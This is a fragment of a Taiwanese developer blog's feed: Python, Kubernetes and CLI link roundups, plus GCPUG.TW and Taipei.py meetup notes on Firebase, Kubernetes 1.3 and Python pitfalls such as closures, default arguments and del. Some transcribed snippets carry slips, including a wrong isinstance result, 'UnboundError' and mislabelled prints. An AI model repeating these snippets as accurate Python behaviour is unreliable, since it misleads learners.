&lt;li&gt;&lt;a href="https://www.toptal.com/python/an-introduction-to-mocking-in-python"&gt;Mocking in Python: A Guide to Better Unit Tests | Toptal&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/3845423/remove-empty-strings-from-a-list-of-strings"&gt;python - Remove empty strings from a list of strings - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/14399534/how-can-i-reference-requirements-txt-for-the-install-requires-kwarg-in-setuptool"&gt;python - How can I reference requirements.txt for the install_requires kwarg in setuptools' setup.py file? - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;原來有 &lt;code&gt;from pip.req import parse_requirements&lt;/code&gt; 可用  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pip.req&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;parse_requirements&lt;/span&gt;  

&lt;span class="c1"&gt;# parse_requirements() returns generator of pip.req.InstallRequirement objects  &lt;/span&gt;
&lt;span class="n"&gt;install_reqs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;parse_requirements&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;requirements_path&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="c1"&gt;# reqs is a list of requirement  &lt;/span&gt;
&lt;span class="c1"&gt;# e.g. [&amp;#39;django==1.5.1&amp;#39;, &amp;#39;mezzanine==1.4.6&amp;#39;]  &lt;/span&gt;
&lt;span class="n"&gt;reqs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ir&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;ir&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;install_reqs&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  

&lt;span class="n"&gt;setup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;  
&lt;span class="o"&gt;...&lt;/span&gt;  
    &lt;span class="n"&gt;install_requires&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;reqs&lt;/span&gt;  
&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&lt;a href="http://selfboot.cn/2016/06/13/python_performance_analysis/"&gt;Python 性能分析大全 | Just For Fun&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://hynek.me/articles/hasattr/"&gt;hasattr() – A Dangerous Misnomer · Homepage of Hynek Schlawack&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;hasattr()&lt;/code&gt; 問題很多，不要用。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.jupyter.org/2016/07/08/ipython-5-0-released/"&gt;Release of IPython 5.0&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://ipython.readthedocs.io/en/stable/whatsnew/version5.html"&gt;5.x Series — IPython 5.0.0 documentation&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;語法上色，還有使用 &lt;code&gt;prompt-toolkit&lt;/code&gt; 的補完功能。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/eliangcs/http-prompt"&gt;GitHub - eliangcs/http-prompt: HTTPie + prompt_toolkit = an interactive command-line HTTP client featuring autocomplete and syntax highlighting&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/Soft_Job/M.1467888742.A.259.html"&gt;[心得] 我如何在 GitHub 上拿到四千顆星 - 看板 Soft_Job - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Security&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://hitcon-girls.blogspot.tw/2016/07/ctf-ctf.html"&gt;HITCON GIRLS: 【資安小百科】那些年，你曾不懂的 CTF - CTF比賽介紹&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;算是 CTF 新手簡介吧  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://kmweb.coa.gov.tw/subject/ct.asp?xItem=102086&amp;amp;ctNode=2697&amp;amp;mp=174&amp;amp;kpi=0&amp;amp;hashid="&gt;稻米主題館&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;復習一下臺灣稻米耕作歷史  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="K8s"></category><category term="Security"></category><category term="Misc"></category><category term="Npm"></category><category term="Pypy"></category><category term="Android"></category><category term="Compiler"></category><category term="Mapreduce"></category><category term="Cli"></category><category term="Github"></category><category term="Python"></category><category term="Taiwan"></category><category term="Linux"></category></entry><entry><title>GCPUG.TW 20160706</title><link href="https://blog.m157q.tw/posts/2016/07/06/gcpug-tw-20160706/" rel="alternate"></link><published>2016-07-06T22:59:41+08:00</published><updated>2016-07-06T22:59:41+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-07-06:posts/2016/07/06/gcpug-tw-20160706/</id><summary type="html">&lt;h2&gt;Firebase&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Restful  &lt;/li&gt;
&lt;li&gt;Real-time database  &lt;/li&gt;
&lt;li&gt;Easily authentication with OAuth&lt;br /&gt;
&lt;code&gt;ref.authWithOAuthPopup("twitter", function (error, authData) {  
    ...  
}&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Offline support  &lt;ul&gt;
&lt;li&gt;Offline 的時候仍可繼續更改，有網路的時候會自動做 background sync  &lt;/li&gt;
&lt;li&gt;有個要注意的問題是如果有多個人以上修改的話，會以最後修改的那個為主。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Demo  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://mmoasteroids.firebaseapp.com/"&gt;https://mmoasteroids.firebaseapp.com/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://ray-tetris.firebaseapp.com/"&gt;https://ray-tetris.firebaseapp.com/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://firechess-demo.firebaseapp.com/#TzA4m"&gt;https://firechess-demo.firebaseapp.com/#TzA4m&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://ray-livecode.firebaseapp.com/"&gt;https://ray-livecode.firebaseapp.com/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Related Links  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://firebase.googleblog.com/2014/06/geofire-20.html"&gt;https://firebase.googleblog.com/2014/06/geofire-20.html&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/firebase/geofire-js"&gt;https://github.com/firebase/geofire-js&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.sflivebus.com/"&gt;https://www.sflivebus.com/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://firepad.io"&gt;https://firepad.io&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/firebase/firepad/"&gt;https://github.com/firebase/firepad/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://firebase.google.com/pricing/"&gt;https://firebase.google.com/pricing/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Kubernetes&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/kubernetes/kubernetes/wiki/Release-1.3"&gt;Kubernetes 1.3&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Pet Sets  &lt;/li&gt;
&lt;li&gt;Init Containers  &lt;ul&gt;
&lt;li&gt;Sequential Pod Initialization  &lt;/li&gt;
&lt;li&gt;開啟真正的 Application 的時候必須經過一些初始化步驟，1.3 以後可以使用 Init containers 來達到這個功能。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Jobs  &lt;ul&gt;
&lt;li&gt;Work Queue with Pod per work  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cluster Federation  &lt;ul&gt;
&lt;li&gt;Manage clusters across region and providers  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/kubernetes/minikube"&gt;minikube&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Related Links  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://codelabs.developers.google.com/codelabs/cloud-hello-kubernetes/index.html?index=..%2F..%2Findex#0"&gt;Hello Node Kubernetes Codelab&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://codelabs.developers.google.com/codelabs/cloud-orchestrate-with-kubernetes/index.html?index=..%2F..%#0"&gt;Orchestrating the Cloud with Kubernetes&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://codelabs.developers.google.com/codelabs/cloud-slack-bot/index.html?index=..%2F..%2Findex#0"&gt;Build a Slack Bot with Node.js on Kubernetes&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://codelabs.developers.google.com/codelabs/cloud-compute-kubernetes/index.html?index=..%2F..%2Findex#0"&gt;Compute Engine &amp;amp; Kubernetes (Container Engine)&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="GCPUG.TW"></category><category term="Firebase"></category><category term="Kubernetes"></category></entry><entry><title>Y2016W26</title><link href="https://blog.m157q.tw/posts/2016/07/03/y2016w26/" rel="alternate"></link><published>2016-07-03T23:59:59+08:00</published><updated>2016-07-03T23:59:59+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2016-07-03:posts/2016/07/03/y2016w26/</id><summary type="html">&lt;h3&gt;Algorithm&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://bigocheatsheet.com/"&gt;Big-O Algorithm Complexity Cheat Sheet&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;CLI&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/6273608/how-to-pass-argument-to-makefile-from-command-line"&gt;parameters - How to pass argument to Makefile from command line? - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;$(filter-out $@,$(MAKECMDGOALS))&lt;/code&gt; 這 trick 有點神奇  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;GAE&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.manejandodatos.es/2014/12/work-front-end-back-end-google-app-engine/"&gt;How to work with Front-end and back-end in Google App Engine - Manejando datos&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/17555269/access-control-allow-origin-header-on-google-app-engine"&gt;python - Access-Control-Allow-Origin header on Google App Engine - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;GitHub&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://theinitium.com/article/20160628-mainland-githubcensor/"&gt;開源「趙家人」名單，GitHub激怒中國網安協會首出拳 | 端傳媒 Initium Media&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Joke&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://home.gamer.com.tw/creationDetail.php?sn=3238960"&gt;【刺客翻譯】單調邊緣住宅改造化 - fired00002的創作 - 巴哈姆特&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這次的 ARuFa 也好猛 XDDD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://rocket.cafe/talks/77459"&gt;持續寫作、迅速決策的竅門：三份草稿 | Rocket Café 火箭科技評論&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Programming&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://bigocheatsheet.com/#chart"&gt;Big-O Algorithm Complexity Cheat Sheet&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/14399534/how-can-i-reference-requirements-txt-for-the-install-requires-kwarg-in-setuptool"&gt;python - How can I reference requirements.txt for the install_requires kwarg in setuptools' setup.py file? - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://hynek.me/articles/hasattr/"&gt;hasattr() – A Dangerous Misnomer · Homepage of Hynek Schlawack&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;hasattr() 很恐怖，不要用。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/3845423/remove-empty-strings-from-a-list-of-strings"&gt;python - Remove empty strings from a list of strings - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;filter(None, seq)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;StackOverFlow&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/21938028/how-can-i-get-a-favicon-to-show-up-in-my-django-app"&gt;How can I get a favicon to show up in my django app? - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Travis CI&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/solutions/continuous-delivery-with-travis-ci"&gt;Continuous Delivery with Travis CI  |  Solutions  |  Google Cloud Platform&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Trivia&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E7%A7%91%E5%A8%81%E7%89%B9%E7%AC%AC%E7%B4%8D%E7%88%BE"&gt;科威特第納爾 - 维基百科，自由的百科全书&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;最高幣值的貨幣：1 KWD == 3.31 USD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Algorithm"></category><category term="GAE"></category><category term="StackOverFlow"></category><category term="CLI"></category><category term="Trivia"></category><category term="Joke"></category><category term="Programming"></category><category term="Misc"></category><category term="Python"></category><category term="GitHub"></category><category term="Travis CI"></category></entry><entry><title>Taipei.py 20160630</title><link href="https://blog.m157q.tw/posts/2016/06/30/taipei-py-20160630/" rel="alternate"></link><published>2016-06-30T19:08:44+08:00</published><updated>2016-06-30T19:08:44+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-06-30:posts/2016/06/30/taipei-py-20160630/</id><summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.meetup.com/Taipei-py/events/230363477/"&gt;http://www.meetup.com/Taipei-py/events/230363477/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Python 中常遇到的小錯誤 - Tim&lt;/h2&gt;
&lt;h3&gt;Space vs Tab&lt;/h3&gt;
&lt;p&gt;若是縮排減少，會把堆疊 pop 到縮排與堆疊頂端一致。  &lt;/p&gt;
&lt;h3&gt;Default Argument&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;def play(song_list=[]):  
    song_list.append(&amp;#39;a random song&amp;#39;)  
    print(song_list)  

play()  
play()  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;=&amp;gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[&amp;#39;a random song&amp;#39;]  
[&amp;#39;a random song&amp;#39;, &amp;#39;a random song&amp;#39;]  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;初始化只會初始一次  &lt;/p&gt;
&lt;h3&gt;Closure&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;def outer():  
    outer_variable = 10  

    def common():  
        print(outer_variable)  

    outer_variable = 100  

    return common  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;=&amp;gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;outer()()  

100  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;當產生 Closure 的時候，Python 並沒有執行函數內的程式。  &lt;/li&gt;
&lt;li&gt;裡面的變數還沒有取得 reference，Python 只是記住變數名字而已(Lexical Scope)  &lt;/li&gt;
&lt;li&gt;被 closure 記住的變數，不會立刻被 GC。  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;def outer():  
    outer_variable = 10  

    def common(parameter=outer_variable):  
        print(parameter)  

    outer_variable = 100  

    return common  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;=&amp;gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;outer()()  

10  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;改成用 &lt;code&gt;class&lt;/code&gt;, 並使用 &lt;code&gt;__call__&lt;/code&gt;。資源抓取會更清楚，而不是依賴 lexical scope。  &lt;/li&gt;
&lt;li&gt;或是使用 &lt;code&gt;functool.partial&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Global variable&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;value = 10  

def change():  
    value = 20  

change()  
print(value)  

=&amp;gt; 10  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;value = 10  

def change():  
    value = value + 20  

change()  
print(value)  

=&amp;gt; UnboundError  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;value = 10  

def change():  
    global value  
    value += 10  

change()  
print(value)  

=&amp;gt; 20  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;del&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;class&lt;/span&gt; &lt;span class="nx"&gt;SimpleType&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;object&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
    &lt;span class="nx"&gt;def&lt;/span&gt; &lt;span class="nx"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
        &lt;span class="nx"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;simple born&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
    &lt;span class="nx"&gt;def&lt;/span&gt; &lt;span class="nx"&gt;__del__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
        &lt;span class="nx"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;simple born&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="nx"&gt;simple&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;SimpleType&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
&lt;span class="nx"&gt;del&lt;/span&gt; &lt;span class="nx"&gt;simple&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;class&lt;/span&gt; &lt;span class="nx"&gt;FooType&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;object&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
    &lt;span class="nx"&gt;def&lt;/span&gt; &lt;span class="nx"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;parent&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
        &lt;span class="nx"&gt;self&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;parent&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;parent&lt;/span&gt;  
        &lt;span class="nx"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Foo born&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

    &lt;span class="nx"&gt;def&lt;/span&gt; &lt;span class="nx"&gt;__del__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
        &lt;span class="nx"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Foo died&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="kr"&gt;class&lt;/span&gt; &lt;span class="nx"&gt;BarType&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;object&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
    &lt;span class="nx"&gt;def&lt;/span&gt; &lt;span class="nx"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
        &lt;span class="nx"&gt;self&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;FooType&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
        &lt;span class="nx"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Bar born&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

    &lt;span class="nx"&gt;def&lt;/span&gt; &lt;span class="nx"&gt;__del__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
        &lt;span class="nx"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Bar died&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;  
&lt;span class="nx"&gt;Foo&lt;/span&gt; &lt;span class="nx"&gt;born&lt;/span&gt;  
&lt;span class="nx"&gt;Bar&lt;/span&gt; &lt;span class="nx"&gt;born&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&lt;code&gt;del&lt;/code&gt; 只會讓名字從 symbol table 消失，並讓 reference count - 1  &lt;/li&gt;
&lt;li&gt;當 reference count 為 0 的時候，才會執行 GC 的動作(&lt;code&gt;__del__&lt;/code&gt;)  &lt;/li&gt;
&lt;li&gt;可以解決 Circular Reference 的問題  &lt;/li&gt;
&lt;li&gt;有 circular reference 的時候 Python 不會真的執行 del  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Interface&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;abc&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;ABCMeta&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;abstractmethod&lt;/span&gt;  

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Sized&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
    &lt;span class="vm"&gt;__metaclass__&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ABCMeta&lt;/span&gt;  

    &lt;span class="nd"&gt;@abstractmethod&lt;/span&gt;  
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__len__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;  

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Missing&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Sized&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
    &lt;span class="k"&gt;pass&lt;/span&gt;  


&lt;span class="n"&gt;Missing&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  

&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="ne"&gt;TypeError&lt;/span&gt;  
    &lt;span class="n"&gt;Can&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;t instantiate abstract class Missing with abstract methods __len__  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;class&lt;/span&gt; &lt;span class="nx"&gt;Struggle&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;object&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
    &lt;span class="nx"&gt;def&lt;/span&gt; &lt;span class="nx"&gt;__len__&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;23&lt;/span&gt;  

&lt;span class="nx"&gt;isinstance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;Struggle&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;Sized&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;True&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Duck Typing  &lt;/p&gt;
&lt;h3&gt;List related&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# Python 2  
data = range(10)  
for l in data:  
    data.remove(l)  
print(data)  
=&amp;gt; [1, 3, 5, 7, 9]  

